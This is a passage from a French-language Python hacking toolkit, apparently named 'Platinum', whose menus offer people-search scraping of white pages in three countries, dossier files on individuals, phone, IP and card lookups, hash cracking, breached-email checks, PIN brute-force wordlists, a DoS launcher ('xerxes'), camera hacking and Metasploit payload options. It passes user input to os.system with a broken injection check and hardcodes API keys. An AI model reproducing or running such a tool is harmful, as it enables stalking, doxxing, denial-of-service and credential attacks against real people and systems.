        soup = bs.BeautifulSoup(requete,'lxml')
        if rue in soup.title.text:
            name = ''
            telephone = ''
            addr = ''

            for p in soup.find_all('h2', class_="c411ListedName"):
                    name = name+str(p.text)+"\n"
            for div in soup.find_all('span', class_="c411Phone"):
                    telephone = telephone+str(div.text)+"\n"
            for tel in soup.find_all('span', class_="adr"):
                    addr = addr+str(tel.text)+"\n"
            name = name[:-1]
            telephone = telephone[:-1]
            addr = addr[:-1]
            if name == '':
                print(Fore.RED+"\n\r"+warning+"Aucun résultat!"+Fore.RESET)
            else:
                table_data = [
                        ['Nom', 'Adresse', 'Téléphone'],
                        [name, addr, telephone]
                ]
                table = SingleTable(table_data)
                print(table.table)
        else:
            
            url = "http://www.fr.canada411.ca/search/?stype=si&what=&where={}%2C+{}+{}".format(maison, rue, province)
            requete = urllib.request.urlopen(url).read().decode('utf-8')
            try:
                soup = bs.BeautifulSoup(requete,'lxml')
                name = soup.find('h1', class_="vcard__name")
                name = name.text
                
                telephone = soup.find('span', class_="vcard__label")
                telephone = telephone.text
                addr = soup.find('div', class_="c411Address vcard__address")
                addr = addr.text
                name = name[:-1]
                telephone = telephone[:-1]
                addr = addr[:-1]
                if name == '':
                    print(Fore.RED+"\n\r"+warning+"Aucun résultat!"+Fore.RESET)
                else:
                    table_data = [
                            ['Nom', 'Adresse', 'Téléphone'],
                            [name, addr, telephone]
                    ]
                    table = SingleTable(table_data)
                    print(table.table)
            except:
                try:
                    name = ''
                    telephone = ''
                    addr = ''

                    for p in soup.find_all('h2', class_="c411ListedName"):
                            name = name+str(p.text)+"\n"
                    for div in soup.find_all('span', class_="c411Phone"):
                            telephone = telephone+str(div.text)+"\n"
                    for tel in soup.find_all('span', class_="adr"):
                            addr = addr+str(tel.text)+"\n"
                    name = name[:-1]
                    telephone = telephone[:-1]
                    addr = addr[:-1]
                    if name == '':
                        print(Fore.RED+"\n\r"+warning+"Aucun résultat!"+Fore.RESET)
                    else:
                        table_data = [
                                ['Nom', 'Adresse', 'Téléphone'],
                                [name, addr, telephone]
                        ]
                        table = SingleTable(table_data)
                        print(table.table)
                except:
                    print(Fore.RED+warning+"Une erreur est survenue!"+Fore.RESET) 
    except urllib.error.URLError:
        print(Fore.RED+warning+"La connexion à été interrompue!"+Fore.RESET)
    except:
        print(Fore.RED+warning+"Une erreur est survenue!"+Fore.RESET) 
    finally:
        input("\n\rAppuyez sur [ENTRER] pour continuer : ")   

def brut_force_4():
    pin = 0
    fichier_brutforce_4 = open('Brutforce_pin_4.txt', 'w')

    while pin < 10:
        res = "000"+str(pin)+"\n"
        fichier_brutforce_4.write(res)
        pin += 1
    while pin < 100:
        res = "00"+str(pin)+"\n"
        fichier_brutforce_4.write(res)
        pin += 1
    while pin < 1000:
        res = "0"+str(pin)+"\n"
        fichier_brutforce_4.write(res)
        pin += 1
    while pin < 10000:
        res = ""+str(pin)+"\n"
        fichier_brutforce_4.write(res)
        pin += 1
    fichier_brutforce_4.close()



def brut_force_6():
    pin = 0
    fichier_brutforce_6 = open('Brutforce_pin_6.txt', 'w')
    while pin < 10:
        res = "00000"+str(pin)+"\n"
        fichier_brutforce_6.write(res)
        pin += 1
    while pin < 100:
        res = "0000"+str(pin)+"\n"
        fichier_brutforce_6.write(res)
        pin += 1
    while pin < 1000:
        res = "000"+str(pin)+"\n"
        fichier_brutforce_6.write(res)
        pin += 1
    while pin < 10000:
        res = "00"+str(pin)+"\n"
        fichier_brutforce_6.write(res)
        pin += 1
    while pin < 100000:
        res = "0"+str(pin)+"\n"
        fichier_brutforce_6.write(res)
        pin += 1
    while pin < 1000000:
        res = ""+str(pin)+"\n"
        fichier_brutforce_6.write(res)
        pin += 1
    fichier_brutforce_6.close()

def access_denied():
    access_denied = "Access Denied"
    table_data = [
        [access_denied]
    ]
    table = SingleTable(table_data)
    print("\n\r"+Fore.RED+table.table+Fore.RESET)

def hash_decryptor():
    test_connexion_sans_return()
    hash_input = str(input("[+][Platinum][choice][Hash:~$ "))
    try:
        url = "https://lea.kz/api/hash/{}".format(hash_input)
        text = requests.get(url).text
        data = json.loads(text)
        passwd = data['password']
        print("Votre hash correspond à : "+passwd)
    except:
        print("Le hash n'a pas été trouvé!")
    input("\n\rAppuyez sur [ENTRER] pour continuer : ")



def breach_account():
    test_connexion_sans_return()
    def menu_breach_accont():
        print("""+---------------------------------------------------+
|                     Services                      |
+---------------------------------------------------+
| [0] Retour                                        |
| [1] Have I Been Pwned (Peut causer des problèmes) |
| [2] Lea.kz (Moins fiable)                         |
+---------------------------------------------------+
""")

    def have_i_been_pwned():  
        import json
        pwned_account = input("[+][Platinum][choice][PwnedAccount][Email:~$ ")
        url = "https://haveibeenpwned.com/api/breachedaccount/{}".format(pwned_account)
        try:
            data = requests.get(url).content.decode('utf-8')
            try:
                scrap_data = bs.BeautifulSoup(data, 'lxml')
                titre = scrap_data.title.text
                if "Request Blocked" in titre:
                    access_denied()
                    input("\n\rAppuyez sur [ENTRER] pour continuer : ")
                    return

                else:
                    pass
            except:
                pass
            try:
                values = json.loads(data)
            except:
                print(Fore.LIGHTGREEN_EX+"\n\rVotre Email figure dans aucune base de donnée"+Fore.RESET)
                input("\n\rAppuyez sur [ENTRER] pour continuer : ")
                return
            compteur = 0
            
            while 1:

                status = values[compteur]
                if status == "":
                    break
                else:
                    compteur += 1 
                    print("Votre compte figure dans base de données de : ",status)
                    continue
            print(Fore.RED+"\n\rCHANGEZ VOS MOT DE PASSES!!!"+Fore.RESET)
        except:
            input("\n\rAppuyez sur [ENTRER] pour continuer : ")

    def leakz():
        while 1:
            pwned_account = input("[+][Platinum][choice][PwnedAccount][Email:~$ ")
            url = "https://lea.kz/api/mail/"+str(pwned_account)
            try:
                req = requests.get(url=url, headers=headers).text
            except:
                print(Fore.RED+warning+"La connexion à été interrompue!"+Fore.RESET)
            try:
                data = json.loads(req)
            except:
                print(Fore.LIGHTGREEN_EX+"\n\rVotre Email figure dans aucune base de donnée!"+Fore.RESET)
                input("\n\rAppuyez sur [ENTRER] pour continuer : ")
                break
            leaked = data['leaked']
            print(Fore.RED+"Votre compte figure dans base de données de : "+leaked+"\n\rCHANGEZ VOS MOT DE PASSES!!!"+Fore.RESET)
            input("\n\rAppuyez sur [ENTRER] pour continuer : ")
            break
    
    while 1:
        clear()
        menu_breach_accont()
        choice_breach_service = input("[+][Platinum][choice][PwnedAccount][choice:~$ ")
        if choice_breach_service == "0":
            return
        elif choice_breach_service == "1":
            have_i_been_pwned()
        elif choice_breach_service == "2":
            leakz()
        else:
            print(choice_breach_service,"ne fait pas partit des choix!")
            time.sleep(2)
        



def ip_tracker():
    IP_traker = input("""[+][Platinum][choice][IP tracker][IP address:~$ """)
    clear()
    url = "http://api.ipinfodb.com/v3/ip-city/?key=0a58efecc2c2ce4f114bb5beb2b366f927d70496e73e213d22058292163c031f&ip={}&format=json".format(IP_traker)
    response = requests.get(url).content.decode('utf-8')
    data = json.loads(response)

    print('\n\rValide           :',data["statusCode"])
    print('Status Message   :',data["statusMessage"])
    print('IP adresse       :',data["ipAddress"])
    print('Code du pays     :',data["countryCode"])
    print('Nom du pays      :',data["countryName"])
    print('Nom de la region :',data["regionName"])
    print('Nom de la ville  :',data["cityName"])
    print('zipcode          :',data["zipCode"])
    print('Latitude         :',data["latitude"])
    print('Longitude        :',data["longitude"])
    print('Temps de la zone :',data["timeZone"])
    input("\n\rAppuyez sur [ENTRER] pour continuer : ")


def phone():
    test_connexion_sans_return()
    choice = input("[+][Platinum][choice][Phone tracker][Phone number:~$ ")
    clear()
    url = "http://apilayer.net/api/validate?access_key=76eb298404a8fe493ab570d552c22fb0&number={}&country_code=&format=1".format(choice)
    reponse = requests.get(url).content.decode('utf-8')
    data = json.loads(reponse)
    print('\n\rValide                :',data["valid"])
    print('Numero                :',data["number"])
    print('Format locale         :',data['local_format'])
    print('Format internationale :',data['international_format'])
    print('Prefixe               :',data["country_prefix"])
    print('Initiales             :',data["country_code"])
    print('Nom du pays           :',data["country_name"])
    print('Localisation          :',data["location"])
    print('Compagnie             :',data["carrier"])
    print('Type de ligne         :',data["line_type"])
    input("\n\rAppuyez sur [ENTRER] pour continuer : ")

def nmap_fonction():
    choice_nmap_target = input("[+][Platinum][choice][Nmap][Target:~$ ")
    if (";" or "&") in choice_nmap_target:
        xss()
    else:
        pass
    choice_nmap_port = input("[+][Platinum][choice][Nmap][Port:~$ ")
    if (";" or "&") in choice_nmap_port:
        xss()
    else:
        pass


    CMD = """nmap {} -p {} """.format(choice_nmap_target, choice_nmap_port)
    os.system(CMD)
    input("\n\rAppuyez sur [ENTRER] pour continuer : ")
def generateur_de_mot_passe():
    while 1:
        char = input("[+][Platinum][choice][Password Generator][Number of characters :~$ ")
        
        try:
            char = int(char)
            if char < 8:
                print("Vous devez entrer au moins 8 charactères!")
                input("\n\rAppuyez sur [ENTRER] pour continuer : ")
                continue
            elif char > 1000000:
                print("Vous devez entrez moins de 1 000 000 de charactères!")
                input("\n\rAppuyez sur [ENTRER] pour continuer : ")
            else:
                pass
            break
        except:
            print("Vous devez entrer un nombre entier!")
            continue
    nombre = ''
    i = 0
    while i < char:
        r = random.choice(liste)
        nombre = nombre+str(r)
        i += 1
    print(nombre)
    input("\n\rAppuyez sur [ENTRER] pour continuer : ")
def credit_card_checker():
    test_connexion_sans_return()
    url = "https://lookup.binlist.net/"
    numero_carte = str(input("[+][Platinum][choice][Credit Card Checker][Number :~$ "))
    url = url+numero_carte
    print("")
    try:
        reponse = requests.get(url).content.decode('utf-8')
        data = json.loads(reponse)
    
        donnee1 = "Type de carte       : "+str(data["scheme"])
        donnee2 = "Debit / Credit      : "+str(data["type"])
        donnee3 = "Marque de la carte  : "+str(data["brand"])
        donnee4 = "Format numérique    : "+str(data["country"]["numeric"])
        donnee5 = "Initiales du pays   : "+str(data["country"]["alpha2"])
        donnee6 = "Nom du pays         : "+str(data["country"]["name"])
        donnee7 = "Type de monnaie     : "+str(data["country"]["currency"])
        donnee8 = "Latitude            : "+str(data["country"]["latitude"])
        donnee9 = "Longitude           : "+str(data["country"]["longitude"])
        try:
            print("Taille du numéro    : "+str(data["number"]["length"]))
            print("Utilisation du Luhn : "+str(data["number"]["luhn"]))
        except:
            pass
        print(donnee1+"\n"+donnee2+"\n"+donnee3+"\n"+donnee4+"\n"+donnee5+"\n"+donnee6+"\n"+donnee7+"\n"+donnee8+"\n"+donnee9)
        try:
            print("Nom de la banque    : "+str(data["bank"]["name"]))
            print("Site de la banque   : "+str(data["bank"]["url"]))
            print("Numéro de la banque : "+str(data["bank"]["phone"]))
            print("Ville de la banque  : "+str(data["bank"]["city"]))
        except:
            pass
        
    except:
        print("Le numéro de carte est Invalide!")
    finally:
        input("\n\rAppuyez sur [ENTRER] pour continuer : ")
def dos():
    ip_target = input("[+][Platinum][choice][Dos][IP :~$ ")
    if (";" or "&") in ip_target:
        xss()
    else:
        pass
    port_target = input("[+][Platinum][choice][Dos][Port :~$ ")
    if (";" or "&") in port_target:
        xss()
    else:
        pass
    cmd = "./dos {} {}".format(ip_target,port_target)
    os.system(cmd)
    input("\n\rAppuyez sur [ENTRER] pour continuer : ")


def resize():
    if os.name == "nt":
        pass
    else:
        try:
            os.system("resize -s 30 99")
        except:
            pass
        
def color():
    if os.name == "nt":
        os.system("color 0a")
    else:
        pass

def title():
    if os.name == "nt":
        try:
            os.system("title Platinum")
        except:
            pass
    else:
        pass
title()

resize()
#color()


def pages_jaunes_FR(requete=''):
    page = requete.text
    soup = bs.BeautifulSoup(page, 'html.parser')
	
    names = soup.find_all("a", {"class": "denomination-links pj-lb pj-link"})
    addresss = soup.find_all("a", {"class": "adresse pj-lb pj-link"})
    numeros = soup.find_all("strong", {"class": "num"})
    names_liste = []
    adresses_liste = []
    numeros_Liste = []

    for name in names:
        names_liste.append(name.text.strip())
    for adresse in addresss:
        adresses_liste.append(adresse.text.strip())
    for numero in numeros:
        numeros_Liste.append(numero.text.strip())
    
    regroup = zip(names_liste,adresses_liste,numeros_Liste)

    if 'a' in names_liste:
        TABLE_DATA = [
            ('Nom', 'Adresse', 'Téléphone'),
        ]

        for infos in regroup:
            
            try:

                TABLE_DATA.append(infos)

            except AttributeError:
                pass
        table_instance = SingleTable(TABLE_DATA)
        print("\n"+table_instance.table)
        input("\n\rAppuyez sur [ENTRER] pour continuer : ")
    else:
        print(Fore.RED+"\n\r"+warning+"Aucun résultat!"+Fore.RESET)
        input("\n\rAppuyez sur [ENTRER] pour continuer : ")


def pj_fr():
    name = input("[+][Platinum][choice][Info Personne][Prenom et Nom:~$ ")
    name = name.replace(" ", '%20')
    ville = input("[+][Platinum][choice][Info Personne][Ville:~$ ")

    url = "https://www.pagesjaunes.fr/pagesblanches/recherche?quoiqui={}&ou={}".format(name, ville)
    try:
        requete = requests.get(url, headers=headers)
        pages_jaunes_FR(requete)
    except requests.ConnectionError:
        print(Fore.RED+warning+"La connexion à été interrompue!")
    except:
        print(Fore.RED+warning+"Une erreur est survenue!")
    
def num_fr():
    numero = input("[+][Platinum][choice][Info Personne][Numéro:~$ ")
    numero = numero.replace(" ", "")
    
    url = "https://www.pagesjaunes.fr/annuaireinverse/recherche?quoiqui={}".format(numero)
    try:  
        requete = requests.get(url, headers=headers)
        pages_jaunes_FR(requete)
    except requests.ConnectionError:
        print(Fore.RED+warning+"La connexion à été interrompue!")
    except:
        print(Fore.RED+warning+"Une erreur est survenue!")

def adresse_fr():
    adresse = input("[+][Platinum][choice][Info Personne][Adresse:~$ ")
    url = "https://www.pagesjaunes.fr/pagesblanches/recherche?quoiqui=&ou={}".format(adresse)
    try:
        requete = requests.get(url, headers=headers)
        pages_jaunes_FR(requete)
    except requests.ConnectionError:
        print(Fore.RED+warning+"La connexion à été interrompue!")
    except:
        print(Fore.RED+warning+"Une erreur est survenue!")

def list_etat():
    clear()
    print("""AL : Alabama
AK : Alaska
AZ : Arizona
AR : Arkansas
CA : Californie
CO : Colorado
CT : Connecticut
DE : Delaware
DC : District de Columbia
FL : Floride
GA : Géorgie
HI : Hawaï
ID : Idaho
IL : Illinois
IN : Indiana
IA : Iowa
KS : Kansas
KY : Kentucky
LA : Louisiane
ME : Maine
MD : Maryland
MA : Massachusetts
MI : Michigan
MN : Minnesota
MS : Mississippi
MO : Missouri
MT : Montana
NE : Nebraska
NV : Nevada
NH : New Hampshire
NJ : New Jersey
NM : Nouveau-Mexique
NY : New York
NC : Caroline du Nord
ND : Dakota du Nord
OH : Ohio
OK : Oklahoma
OR : Oregon
PA : Pennsylvanie
RI : Rhode Island
SC : Caroline du Sud
SD : Dakota du Sud
TN : Tennessee
TX : Texas
UT : Utah
VT : Vermont
VA : Virginie
WA : Washington
WV : Virginie-Occidentale
WI : Wisconsin
WY : Wyoming
    """)

def pages_jaunes_usa_decode(requete=''):
    soup = bs.BeautifulSoup(requete,'lxml')

    name = ''
    telephone = ''
    addr = ''

    for p in soup.find_all('a', class_="fullname"):
            name = name+str(p.text)+"\n"
    for div in soup.find_all('p', class_="phone"):
            telephone = telephone+str(div.text)+"\n"
    for tel in soup.find_all('p', class_="address"):
            addr = addr+str(tel.text)+"\n"
    name = name[:-1]
    telephone = telephone[:-1]
    addr = addr[:-1]
    if name == '':
        print(Fore.RED+"\n\r"+warning+"Aucun résultat!"+Fore.RESET)
    else:
        table_data = [
                ['Nom', 'Adresse', 'Téléphone'],
                [name, addr, telephone]
        ]
        table = SingleTable(table_data)
        print(table.table)
    

def pj_usa_name():
    fname = input("[+][Platinum][choice][Info Personne][Prénom:~$ ")
    lname = input("[+][Platinum][choice][Info Personne][Nom:~$ ")
    liste_etat = input("[+] Voulez vous voir la liste des états en fonction de leur sufixes? (o/N) : ")
    if liste_etat == "o" or liste_etat == "O":
        list_etat()
    else:
        pass
    state = input("[+][Platinum][choice][Info Personne][État (ex : WA) :~$ ")
    url = "https://people.yellowpages.com/whitepages/?first_name={}&last_name={}&zip=&state={}".format(fname, lname, state)
    try:
        requete = urllib.request.urlopen(url).read().decode('utf-8')
        pages_jaunes_usa_decode(requete)
    except urllib.error.URLError:
        print(Fore.RED+warning+"La connexion à été interrompue!"+Fore.RESET)
    except:
        print(Fore.RED+warning+"Une erreur est survenue!"+Fore.RESET)
    input("\n\rAppuyez sur [ENTRER] pour continuer : ")

def pj_usa_numero():
    numero = input("[+][Platinum][choice][Info Personne][Numéro:~$ ")
    numero = numero.replace(" ","")
    url = "https://people.yellowpages.com/whitepages/phone-lookup?phone={}".format(numero)
    try:
        requete = urllib.request.urlopen(url).read().decode('utf-8')
        pages_jaunes_usa_decode(requete)
    except urllib.error.URLError:
        print(Fore.RED+warning+"La connexion à été interrompue!"+Fore.RESET)
    except:
        print(Fore.RED+warning+"Une erreur est survenue!"+Fore.RESET)
    input("\n\rAppuyez sur [ENTRER] pour continuer : ")

def pj_usa_adresse():
    adresse = input("[+][Platinum][choice][Info Personne][Adresse:~$ ")
    adresse = adresse.replace(" ", "+")
    liste_etat = input("[+] Voulez vous voir la liste des états en fonction de leur sufixes? (o/N) : ")
    if liste_etat == "o" or liste_etat == "O":
        list_etat()
    else:
        pass
    state = input("[+][Platinum][choice][Info Personne][État (ex : WA) :~$ ")
    zipcode = input("[+][Platinum][choice][Info Personne][Code postal :~$ ")
    url = "https://people.yellowpages.com/whitepages/address?street={}&zip={}&state={}".format(adresse, zipcode, state)
    try:
        requete = urllib.request.urlopen(url).read().decode('utf-8')
        pages_jaunes_usa_decode(requete)
    except urllib.error.URLError:
        print(Fore.RED+warning+"La connexion à été interrompue!"+Fore.RESET)
    except:
        print(Fore.RED+warning+"Une erreur est survenue!"+Fore.RESET)
    input("\n\rAppuyez sur [ENTRER] pour continuer : ")


def Google(requete='', requete2=''):

    encodeList = [
		"%21","%23","%24","%26","%27","%28","%29","%2A","%2B","%2C","%2F","%3A","%3B","%3D","%3F","%40","%5B","%5D",
		"%20","%22","%25","%2D","%2E","%3C","%3E","%5C","%5E","%5F","%60","%7B","%7C","%7D","%7E"
	]

    encodeDic = {
		"%21": "!",
		"%23": "#",
		"%24": "$",
		"%26": "&",
		"%27": "'",
		"%28": "(",
		"%29": ")",
		"%2A": "*",
		"%2B": "+",
		"%2C": ",",
		"%2F": "/",
		"%3A": ":",
		"%3B": ";",
		"%3D": "=",
		"%3F": "?",
		"%40": "@",
		"%5B": "[",
		"%5D": "]", 
		"%20": " ",
		"%22": "\"",
		"%25": "%",
		"%2D": "-",
		"%2E": ".",
		"%3C": "<",
		"%3E": ">",
		"%5C": "\\",
		"%5E": "^",
		"%5F": "_",
		"%60": "`",
		"%7B": "{",
		"%7C": "|",
		"%7D": "}",
		"%7E": "~"
    }
    if requete2 != '':
        content = requete2.text
        urls = re.findall('url\\?q=(.*?)&', content)
        for url in urls:
            for char in encodeList:
                find = re.search(char, url)
                if find:
                    charDecode = encodeDic.get(char)
                    url = url.replace(char, charDecode)
            if not "googleusercontent" in url:
                if not "/settings/ads" in url:
                    if not "/policies/faq" in url:
                        print("[+] Connexion possible : "+url)
    else:
        pass

    content = requete.text
    urls = re.findall('url\\?q=(.*?)&', content)
    for url in urls:
        for char in encodeList:
            find = re.search(char, url)
            if find:
                charDecode = encodeDic.get(char)
                url = url.replace(char, charDecode)
        if not "googleusercontent" in url:
            if not "/settings/ads" in url:
                if not "/policies/faq" in url:
                    print("[+] Connexion possible : "+url)

def Google_search_pseudo():
    pseudo = input("[+][Platinum][choice][Username][Pseudo:~$ ")
    url = "https://www.google.com/search?num=100&q=\\{}\\".format(pseudo)
    url2 = "https://www.google.com/search?num=100&q=\\intitle:\"{}\"\\".format(pseudo)
    requete = requests.get(url)
    requete2 = requests.get(url2)
    Google(requete=requete, requete2=requete2)
    input("\n\rAppuyez sur [ENTRER] pour continuer : ")

def Google_search():
    pseudo = input("[+][Platinum][choice][Username][Recherche:~$ ")
    url = "https://www.google.com/search?num=100&q=\\{}\\".format(pseudo)
    requete = requests.get(url)
    Google(requete=requete)
    input("\n\rAppuyez sur [ENTRER] pour continuer : ")

def menu_terciere():
    fonctions = """[0] Quitter le programme
[1] Attaque DOS (xerxes)
[2] Pirater cameras de surveillance
[3] Générer un mot de passe indéchiffrable
[4] Scanneur réseaux (local)
[5] IP traceur
[6] Whois (Information sur une adresse IP)
[7] Nmap
[8] Faire une base de données
[9] Lire la base de données
[<] Page précédente                       
[>] Page suivante                (3 sur 4)"""
    table_menu3 = [
            ['                 Fonctions'],
            [fonctions]
    ]
    table3 = SingleTable(table_menu3)
    print(table3.table)



def make_data_file():
    fname = input("Prénom : ")
    lname = input("Nom : ")
    pseudo = input("Pseudo : ")
    born = input("Date de naissane : ")
    vie = input("Vivant ou Mort : ")
    ntf = input("Numéro de téléphone fixe : ")
    ntm = input("Numéro de téléphone mobile : ")
    pays = input("Pays : ")
    ville = input("Ville : ")
    province = input("Province : ")
    zipcode = input("Code postal : ")
    addr = input("Adresse : ")
    ip = input("Adresse IP : ")
    travail = input("Travail : ")
    contenue = """Prenom : {}
Nom : {}
Pseudo : {}
Date de naissance : {}
Vivant ou Mort : {}
Numéro de téléphone fixe : {}
Numéro de téléphone mobile : {}
Pays : {}
Ville : {}
Province : {}
Code postal : {}
Adresse : {}
Adresse IP : {}
Travail : {}
    """.format(fname, lname, pseudo, born, vie, ntf, ntm, pays, ville, province, zipcode, addr, ip, travail)
    
    test = os.path.exists('database')
    if test == True:
        pass
    else:
        os.mkdir('database')
    
    while 1:
        clear()
        name_file = input("\n\rNom du fichier : ")
        name_file = name_file.replace(' ', '_')
        name_file += ".txt"
        
        liste_files = os.listdir("database")
        if name_file in liste_files:
            print(Fore.RED+"\n\r"+warning+"Le fichier existe déja veuillez choisir un autre nom de fichier!"+Fore.RESET)
            input("\n\rAppuyez sur [ENTRER] pour continuer : ")
            clear()
        else:
            break
    try:
        fichier_data = open('database/'+name_file, 'w')
        fichier_data.write(contenue)
        fichier_data.close()
    except KeyboardInterrupt:
        fichier_data.close()

def read_database():
    test = os.path.exists('database')
    if test == True:
        clear()
        pass
    else:
        print(Fore.RED+"\n\r"+warning+"Il y a aucune base de données!"+Fore.RESET)
        input("\n\rAppuyez sur [ENTRER] pour continuer : ")
        return

    for files in os.listdir('database'):
        if os.path.isdir(files):
            pass
            
        else:
            try:
                fopen = open('database/'+files, 'r')
                contenue = fopen.read()
                print("\n\r"+"Fichier : "+Fore.CYAN+files+Fore.RESET+"\n\r")
                print(contenue)
                print("--------------------------------------------------------------------")
            except:
                fopen.close()


def rm_file_database():
    test = os.path.exists('database')
    if test == True:
        while 1:
            clear()
            validation = input(Fore.YELLOW+warning+"Voulez vous vraiment faire ça? (o/N) : "+Fore.RESET)
            if validation == "" or validation == "n" or validation == "N":
                return
            elif validation == "o" or validation == "O":
                break
            else:
                print(Fore.RED+validation,"ne fait pas partit des choix"+Fore.RESET)
                time.sleep(2)
                continue

        clear()
    else:
        print(Fore.RED+"\n\r"+warning+"Il y a aucune base de données!"+Fore.RESET)
        input("\n\rAppuyez sur [ENTRER] pour continuer : ")
        return
    print("[0] Retour")
    for files in os.listdir('database'):
        if os.path.isdir(files):
            pass
            
        else:
            print("Fichier : "+Fore.CYAN+files+Fore.RESET)
    
    rm_name = input("[+][Platinum][choice][RmDBFile][NameFile:~$ ")
    if rm_name == "0":
        return
    else:
        pass
    try:
        os.remove("database/"+rm_name)
    except:
        print(Fore.RED+"\n\r"+warning+"Le fichier est introuvable!"+Fore.RESET)
        input("\n\rAppuyez sur [ENTRER] pour continuer : ")
        return

def rm_all_database():
    test = os.path.exists('database')
    if test == True:
        clear()
        while 1:
            clear()
            validation = input(Fore.YELLOW+warning+"Voulez vous vraiment faire ça? (o/N) : "+Fore.RESET)
            if validation == "" or validation == "n" or validation == "N":
                return
            elif validation == "o" or validation == "O":
                break
            else:
                print(Fore.RED+validation,"ne fait pas partit des choix"+Fore.RESET)
                time.sleep(2)
                continue
        clear()
    else:
        print(Fore.RED+"\n\r"+warning+"Il y a aucune base de données!"+Fore.RESET)
        input("\n\rAppuyez sur [ENTRER] pour continuer : ")
        return
    if os.name == "nt":
        os.system("rmdir database /S /Q")
    else:
        os.system("rm -rf database/")
    input("\n\rAppuyez sur [ENTRER] pour continuer : ")



def menu_4():
    fonctions = """[0] Quitter le programme
[1] Supprimer un fichier de la base de données
[2] Supprimer toute la base de données
[3] Cree un fichier pour BrutForce un code pin a 4 chiffres
[4] Cree un fichier pour BrutForce un code pin a 6 chiffres
[<] Page précédente                               (4 sur 4)"""
    table_menu4 = [
            ['                         Fonctions'],
            [fonctions]
    ]
    table4 = SingleTable(table_menu4)
    print("\n\r"+table4.table)

try:

    while 1:
        #Menu principale
        clear()
        banniere_1()
        menu_principal()
        choice = input("[+][Platinum][choice:~$ ")
        if choice == "0":
            exit()


        elif choice == "1":
            pj_ca_personne()

        elif choice == "2":
            pj_ca_numero()
        

        elif choice == "3":
            pj_ca_adresse()

        elif choice == "4":
            pj_usa_name()
            

        elif choice == "5":
            pj_usa_numero()
    
        elif choice == "6":
            pj_usa_adresse()
    
        elif choice == "7":
            pj_fr()

        elif choice == "8":
            num_fr()
            
        elif choice == "9":
            adresse_fr()
    
        elif choice == ">":
            while 1:
                # Menu secondaire
                clear()
                banniere_1()
                menu_secondaire()
                choice_secondaire = input("[+][Platinum][choice:~$ ")
                if choice_secondaire == "0":
                    exit()
                elif choice_secondaire == "1":
                    facebook_stalk()
                elif choice_secondaire == "2":
                    credit_card_checker()
                elif choice_secondaire == "3":
                    Google_search_pseudo()
                elif choice_secondaire == "4":
                    Google_search()
                elif choice_secondaire == "5":
                    phone()
                elif choice_secondaire == "6":
                    breach_account()
                elif choice_secondaire == "7":
                    hash_decryptor()
                elif choice_secondaire == "8":
                    metasploit_virus()
                elif choice_secondaire == "9":
                    os.system("msfconsole")
                elif choice_secondaire == "<":
                    break
                elif choice_secondaire == ">":
                    while 1:
                        #Menu terciaire
                        clear()
                        banniere_1()
                        menu_terciere()
                        choice_terciere = input("[+][Platinum][choice:~$ ")
                        if choice_terciere == "0":
                            exit()
                        elif choice_terciere == "1":
                            check_windows()
                            dos()
                        elif choice_terciere == "2":
                            hack_cam()
                        elif choice_terciere == "3":
                            generateur_de_mot_passe()
                        elif choice_terciere == "4":
                            #SCANNEUR.PY IS NOT CODED BY ME (CR4ZYB0T)
                            check_windows()
                            try:
                                os.system("sudo python scanneur.py")
                            except:
                                print(Fore.RED+warning,"Le fichier 'scanneur.py' est manquant!"+Fore.RESET)
                            input("\n\rAppuyez sur [ENTRER] pour continuer : ")
                        elif choice_terciere == "5":
                            ip_tracker()
                        elif choice_terciere == "6":
                            check_windows()
                            whois()
                        elif choice_terciere == "7":
                            check_windows()
                            nmap_fonction()
                        elif choice_terciere == "8":
                            make_data_file()
                        elif choice_terciere == "9":
                            read_database()
                        elif choice_terciere == "<":
                            break
                        elif choice_terciere == ">":
                            while 1:
                                #MENU 4
                                clear()
                                banniere_1()
                                menu_4()
                                choice_4 = input("[+][Platinum][choice:~$ ")
                                if choice_4 == "0":
                                    exit()
                                elif choice_4 == "1":
                                    rm_file_database()
                                elif choice_4 == "2":
                                    rm_all_database()
                                elif choice_4 == "3":
                                    brut_force_4()
                                elif choice_4 == "4":
                                    brut_force_6()
                                elif choice_4 == "<":
                                    break
                                else:
                                    print(Fore.RED+choice_4,"ne fait pas partit des choix!"+Fore.RESET)
                                    time.sleep(2)
                                    continue

                        else:
                            print(Fore.RED+choice_terciere,"ne fait pas partit des choix!"+Fore.RESET)
                            time.sleep(2)
                            continue
                else:
                    print(Fore.RED+choice_secondaire,"ne fait pas partit des choix!"+Fore.RESET)
                    time.sleep(2)

        else:
            print(Fore.RED+choice,"ne fait pas partit des choix!"+Fore.RESET)
            time.sleep(2)
except KeyboardInterrupt:
    print("")
    exit()
